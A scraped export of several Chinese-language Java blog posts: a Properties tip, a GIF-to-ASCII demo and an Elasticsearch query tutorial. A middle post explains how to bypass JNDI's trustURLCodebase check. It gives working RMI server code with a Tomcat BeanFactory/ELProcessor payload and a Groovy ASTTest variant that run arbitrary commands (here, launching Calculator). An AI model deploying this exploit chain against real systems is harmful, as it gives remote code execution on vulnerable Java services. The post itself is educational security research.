\"mail\"); System.out.println(mailProperties);} 输出结果如下： 1PropertiesUtil.MailProperties(host=localhost, port=25, smtp=PropertiesUtil.Smtp(auth=false, starttlsEnable=false), from=test@yhhblog.com, username=user, password=pwd) 系列博文： 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 实战小技巧8：容器的初始化大小指定 实战小技巧9：List.subList使用不当StackOverflowError 实战小技巧10：不可变容器 实战小技巧11：数组拷贝 实战小技巧12：数字格式化 实战小技巧13：进制转换很简单 实战小技巧14：配置文件Properties II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/09/03/210902-实战小技巧16：Properties配置文件自动装载JavaBean/"},{"title":"211122-Java实现GIF图转字符动图实例demo","text":"上一篇文章介绍了静态图转字符的实现demo；接下来也该是动态图转字符的demo了 从前面几篇文章的学习过程中，要想实现这个功能就属于信手拈来了 单张图转字符完成之后，动图无非是每一张静态图都转一遍，保存最后的结果即可 这里我们就不介绍基础的JDK写法了（感兴趣的可以到前面几篇文章中获取），我们直接进入进阶的玩法 接下来我们借助开源项目 https://github.com/liuyueyi/quick-media 来迅速的实现输出Gif字符图 123456789101112131415161718@Testpublic void testCharLines() { String file = \"https://c-ssl.duitang.com/uploads/item/201707/11/20170711194634_nTiK5.thumb.1000_0.gif\"; java.util.List&lt;java.util.List&lt;String&gt;&gt; list = ImgPixelWrapper.build() .setSourceImg(file) .setBlockSize(3) .setRate(0.6) .setPixelType(PixelStyleEnum.CHAR_COLOR) .build() .asChars(); for (List&lt;String&gt; s: list) { for (String t: s) { System.out.println(t); } System.out.println(\"------- 分割 -------\"); }} 注意上面的实现，List&lt;String&gt; 表示一个张字符图，一个gif图可以转换成多个 具体的输出字符太多，这里简单截取几个看一看效果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$d?{/||_z$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$jJ$#h@$$p/$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$dc%[ `}k$*\\M$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$}@t )WW_d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$}@^ &quot;L@nf$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$(%. )%Z($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${$] &lt;&amp;p($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$cZ&amp;l i8Lc$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$M+m$%/&apos; [$}M$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${8ouL@a)&apos; 0af$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$dU#^ IC@&lt; !$-$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Qhc ` bLd$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Qoj xM{$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$QwZ _$t$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$1@! ;$+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$fo*, `$?$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$+$8W\\` &apos;$\\d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$dCp&quot;YB) ,$@)d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Qw0 ^ &apos;zX$)d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$QZO &quot;L@}d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$dco. \\]ZB{M$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$?@( l]]d&amp;}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$dz%_ +]]{Wpj$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$1QB\\ :]]]]/@jM$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ju$w&gt; &apos;-]]]]]Xkf$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Q{b$bc{}rm- &apos;_]]]]]?!(M$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$f{YbW%$w! &quot;_]]]]]]lQ$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Mf{&gt;$\\\\:~]]]]]]]i{$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Qqh]]]]]]]]-:Q$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_$r]]]]]-l+d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$------- 分割 -------$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$d({/{)n__nd$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$fY$#b%$@$$Bc)$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$MuB} &apos;[d$qvBJQ$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$n%j [*&amp;Q$]$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$?$, ^c@$Jd$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$[$&apos; _WW/$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$?${ ,a#\\$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$QL8&gt; \\*qf$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$(z$%f&apos; i@/M$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$zq8Q0B#t` v&amp;)$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$[@&lt; :X%- ,B)$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$MCp ` 0wc$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Q0m {B)$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$r#. I$}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$($) .B]$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$dY8~ #($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$zk$Bx\\ #nQ$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$}$!r8m W$/Q$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$]$ `&quot; ~r$tQ$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$-$` `U$)d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$)$_ &quot;]L@-M$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Qdq. :]]p8{$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$[@c. +]]}#dj$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$d{@Q&quot; \\]]]]\\@rM$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$d-WW\\` &apos;_]]]]]ckf$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$M]XB&amp;0f1xZ0 &apos;&lt;]]]]]?l(M$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Q}/maM$p} ^_]]]]]]!Q$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Q{~#z,;&lt;?]]]]]]i{$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$dzW[]]]]]]]-;c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$1BU]]]]]-l+d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/22/211122-Java实现GIF图转字符动图实例demo/"},{"title":"211220-JDNI注入：RMI之绕过trustURLCodebase配置的注入实例演示","text":"上一篇博文介绍了RMI绑定一个Reference，导致加载远程class文件时导致的注入问题，当时有提到对于高级的版本，对于默认的配置为java.rmi.server.useCodebaseOnly=false，对于远程的class文件做了安全校验的，但是即便如此，也并没能完全限制住注入 接下来我们来实例演示一下 1. 注入思路按照之前的case，RMI服务端提供的是一个远程的class文件，在客户端访问之后，去加载远程Class并实例化，从而导致静态代码块的执行，就带来了注入问题；现在因为useCodebaseOnly=false,不支持加载远程class文件，那应该怎么处理呢？ 接下来的思路就是既然远程的class不让加载，那么就加载客户端本身的class类，然后通过覆盖其某些方法来实现； 从客户端访问的姿势进行debug，我们可以找到关键的代码节点 com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name) com.sun.jndi.rmi.registry.RegistryContext#decodeObject 12345678910111213141516171819202122232425private Object decodeObject(Remote var1, Name var2) throws NamingException { try { Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; Reference var8 = null; if (var3 instanceof Reference) { var8 = (Reference)var3; } else if (var3 instanceof Referenceable) { var8 = ((Referenceable)((Referenceable)var3)).getReference(); } if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) { throw new ConfigurationException(\"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.\"); } else { return NamingManager.getObjectInstance(var3, var2, this, this.environment); } } catch (NamingException var5) { throw var5; } catch (RemoteException var6) { throw (NamingException)wrapRemoteException(var6).fillInStackTrace(); } catch (Exception var7) { NamingException var4 = new NamingException(); var4.setRootCause(var7); throw var4; }} 上面这个方法，就是加载class文件并实例化的核心代码，重点关注下面两段 123456// 默认trustURLCodebase为false，所以不希望进入下面的异常逻辑，则factory_class_location需要为空if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) { throw new ConfigurationException(\"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.\");} else { return NamingManager.getObjectInstance(var3, var2, this, this.environment);} 从上面的逻辑可以看到，为了不抛出异常，Reference中的factoryClassLocation设置为空；这样就可以继续走下面的NamingManager.getObjectInstance流程；最终核心点在下面的实例创建中，获取Factory，创建实例 javax.naming.spi.NamingManager#createObjectFromFactories 12345678910111213141516171819private static Object createObjectFromFactories(Object obj, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws Exception { // 工厂类 FactoryEnumeration factories = ResourceManager.getFactories( Context.OBJECT_FACTORIES, environment, nameCtx); if (factories == null) return null; // Try each factory until one succeeds ObjectFactory factory; Object answer = null; while (answer == null &amp;&amp; factories.hasMore()) { factory = (ObjectFactory)factories.next(); // 实例化 answer = factory.getObjectInstance(obj, name, nameCtx, environment); } return answer;} 从上面的核心实现上，可以看到两个关键信息： javax.naming.spi.ObjectFactory: 对象工厂类，在客户端找一个这样的工厂类出来，用来创建入侵对象 factory.getObjectInstance: 实例化时，注入我们希望执行的代码 2. 注入服务端首先需要找一个ObjectFactory，我们这里选中的目标是tomcat中的org.apache.naming.factory.BeanFactory 接下来看一下它的getObjectInstance实现 12345678910111213141516171819202122232425262728293031323334353637383940414243public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws NamingException { if (obj instanceof ResourceRef) { try { Reference ref = (Reference) obj; String beanClassName = ref.getClassName(); Class&lt;?&gt; beanClass = null; // 解析forceString，生成对应的 setXxx方法， RefAddr ra = ref.get(\"forceString\"); Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;(); String value; if (ra != null) { value = (String)ra.getContent(); Class&lt;?&gt; paramTypes[] = new Class[1]; paramTypes[0] = String.class; String setterName; int index; /* Items are given as comma separated list */ for (String param: value.split(\",\")) { // 这里的核心，就是解析 forceString, 生成 setXxx 方法，在实例化之后调用 try { forced.put(param, beanClass.getMethod(setterName, paramTypes)); } catch (NoSuchMethodException|SecurityException ex) { } } } Enumeration&lt;RefAddr&gt; e = ref.getAll(); while (e.hasMoreElements()) { // forced 执行 Method method = forced.get(propName); try { method.invoke(bean, valueArray); } catch (IllegalAccessException| } continue; } 上面减去了一些不重要的代码，重点可以看到下面这个逻辑 找到一个jvm中存在的类beanClass 对于key = forceString 的RefAddr，会做一个特殊处理 value形如 argVal = rename 基于上面的形式，会从beanClass中找到一个名为methodName = rename，参数有一个，且为String的方法 在对象实例化时，会调用上面的方法，其中具体的参数值，从 RefAddr中查找key = argVal 的取值 举一个实例如下 123ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null);ref.add(new StringRefAddr(\"forceString\", \"x=eval\"));ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\\\")\")); 上面三行，最终直接的结果就是在创建实例对象时，有下面三步 从ElProcessor中找到eval方法 实例化时，调用eval方法，传参为x对应的值 即在实例化时，相当于执行下面这个方法 1ElProcessor.eval(\"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\\\") 因此我们最终的服务端代码可以如下 123456LocateRegistry.createRegistry(8181);ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null);ref.add(new StringRefAddr(\"forceString\", \"x=eval\"));ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\\\")\"));ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);Naming.bind(\"rmi://127.0.0.1:8181/inject\", referenceWrapper); 注意，服务端也需要依赖tomcat，对于SpringBoot项目，可以引入下面这个依赖 1234&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;&lt;/dependency&gt; 3.实例演示客户端访问姿势与之前没有什么区别，我们这里基于SpringBoot起一个，主要是方便tomcat服务器的指定 12345678&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;&lt;/dependency&gt; 客户端代码如下 12345678910111213public static void injectTest() throws Exception { // 使用JDNI在命名服务中发布引用 Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1:8181\"); InitialContext context = new InitialContext(env); Object obj = context.lookup(\"rmi://127.0.0.1:8181/inject\"); System.out.println(obj);}public static void main(String[] args) throws Exception { injectTest();} 4.小结本文通过实例演示介绍了如何绕过trustURLCodebase=false的场景，从客户端执行逻辑出发，主要思路就是既然远程的class不可性，那就从目标服务器中去找一个满足条件的class，来执行注入代码 要满足我们注入条件的class，需要有下面这个关键要素 javax.naming.spi.ObjectFactory的子类 getObjectInstance实现类中存在执行目标代码的场景 此外就是借助脚本引擎来动态执行代码，本文是借助js，当然也可以考虑Groovy，如下 12345678// 如果是win系统，exec的传参直接是 calc 即可；下面是macos的执行ResourceRef ref = new ResourceRef(\"groovy.lang.GroovyClassLoader\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null);ref.add(new StringRefAddr(\"forceString\", \"x=parseClass\"));String script = \"@groovy.transform.ASTTest(value={\\n\" + \" assert java.lang.Runtime.getRuntime().exec(\\\"/Applications/Calculator.app/Contents/MacOS/Calculator\\\")\\n\" + \"})\\n\" + \"def x\\n\";ref.add(new StringRefAddr(\"x\",script)); 看到这里其实就会有个疑问点，常见的注入代码执行有哪些case呢？除了上面的脚本执行，还有别的么？且看下文 相关博文 本文主要思路来自于，欢迎有兴趣的小伙伴查看原文 * Exploiting JNDI Injections in Java | Veracode blog 211216-JDNI注入：RMI Reference注入问题 - 一灰灰Blog 211213-JDNI注入：RMI基本知识点介绍 - 一灰灰Blog 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/12/20/211220-JDNI注入：RMI之绕过trustURLCodebase配置的注入实例演示/"},{"title":"220412-ElasticSearch基本使用姿势二","text":"本文作为elasticsearch 基本使用姿势第二篇，包含以下内容 查询指定字段 限制返回条数 分页查询 分组查询 高亮 自动补全提示 排序 返回结果聚合，如统计文档数，某个field value的求和、平均值等 更多相关知识点请查看: * 210331-ElasticSearch 基本使用姿势 - 一灰灰Blog 0. 数据准备初始化一个索引，写入一些测试数据 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667post second-index/_doc{ \"@timestamp\": \"2021-06-10 08:08:08\", \"url\": \"/test\", \"execute\": { \"args\": \"id=10&amp;age=20\", \"cost\": 10, \"res\": \"test result\" }, \"response_code\": 200, \"app\": \"yhh_demo\"}post second-index/_doc{ \"@timestamp\": \"2021-06-10 08:08:09\", \"url\": \"/test\", \"execute\": { \"args\": \"id=20&amp;age=20\", \"cost\": 11, \"res\": \"test result2\" }, \"response_code\": 200, \"app\": \"yhh_demo\"}post second-index/_doc{ \"@timestamp\": \"2021-06-10 08:08:10\", \"url\": \"/test\", \"execute\": { \"args\": \"id=10&amp;age=20\", \"cost\": 12, \"res\": \"test result2\" }, \"response_code\": 200, \"app\": \"yhh_demo\"}post second-index/_doc{ \"@timestamp\": \"2021-06-10 08:08:09\", \"url\": \"/hello\", \"execute\": { \"args\": \"tip=welcome\", \"cost\": 2, \"res\": \"welcome\" }, \"response_code\": 200, \"app\": \"yhh_demo\"}post second-index/_doc{ \"@timestamp\": \"2021-06-10 08:08:09\", \"url\": \"/404\", \"execute\": { \"args\": \"tip=welcome\", \"cost\": 2, \"res\": \"xxxxxxxx\" }, \"response_code\": 404, \"app\": \"yhh_demo\"} 1. 查询指定字段比如我现在只关心url返回的状态码, 主要借助_source来指定需要查询的字段，查询的语法和之前介绍的一致 12345678910GET second-index/_search{ \"_source\": [ \"url\", \"response_code\" ], \"query\": { \"match_all\": {} }} 2. 返回条数限制针对返回结果条数进行限制，属于比较常见的case了，在es中，直接通过size来指定 1234567GET second-index/_search{ \"query\": { \"match_all\": {} }, \"size\": 2} 3. 分页查询通过size限制返回的文档数，通过from来实现分页 12345678GET second-index/_search{ \"query\": { \"match_all\": {} }, \"size\": 1, \"from\": 1} (注意下面输出截图，与上面的对比，这里返回的是第二条数据) 4. 分组查询相当于sql中的group by，常用于聚合操作中的统计计数的场景 在es中，使用aggs来实现，语法如下 12345678\"aggs\": { \"agg-name\": { // 这个agg-name 是自定义的聚合名称 \"terms\": { // 这个terms表示聚合的策略，根据 field进行分组 \"field\": \"\", \"size\": 10 } }} 比如我们希望根据url统计访问计数，对应的查询可以是 123456789101112131415GET second-index/_search{ \"query\": { \"match_all\": {} }, \"size\": 1, \"aggs\": { \"my-agg\": { \"terms\": { \"field\": \"url\", \"size\": 2 } } }} 但是在执行时，会发现并不能正常响应 右边返回的提示信息为Text fields are not optimised for operations that require per-document field data like aggregations and sorting, so these operations are disabled by default. Please use a keyword field instead. Alternatively, set fielddata=true on [url] in order to load field data by uninverting the inverted index. Note that this can use significant memory这个异常 简单来说，就是url这个字段为text类型，默认情况下这种类型的不走索引，不支持聚合排序，如果需要则需要设置fielddata=true，或者使用url的分词url.keyword 123456789101112131415GET second-index/_search{ \"query\": { \"match_all\": {} }, \"size\": 1, \"aggs\": { \"my-agg\": { \"terms\": { \"field\": \"url.keyword\", \"size\": 2 } } }} 注意 虽然我们更注重的是分组后的结果，但是hits中依然会返回命中的文档，若是只想要分组后的统计结果，可以在查询条件中添加 size:0 聚合操作和查询条件是可以组合的，如只查询某个url对应的计数 12345678910111213141516171819GET second-index/_search{ \"query\": { \"term\": { \"url.keyword\": { \"value\": \"/test\" } } }, \"size\": 1, \"aggs\": { \"my-agg\": { \"terms\": { \"field\": \"url.keyword\", \"size\": 2 } } }} 上面介绍了TEXT类型的field，根据分词进行聚合操作；还有一种方式就是设置fielddata=true，操作姿势如下 123456789PUT second-index/_mapping{ \"properties\": { \"url\": { \"type\": \"text\", \"fielddata\": true } }} 修改完毕之后，再根据url进行分组查询，就不会抛异常了 5. 全文搜索 211018-ElasticSearch全文搜索支持配置 - 一灰灰Blog 通过配置一个动态索引模板，将所有的field构建一个用于全文检索的field，从而实现全文搜索 6. 聚合操作上面的分组也算是聚合操作中的一种，接下来仔细看一下es的聚合，可以支持哪些东西 聚合语法: 123456789\"aggs\": { \"agg_name\": { // 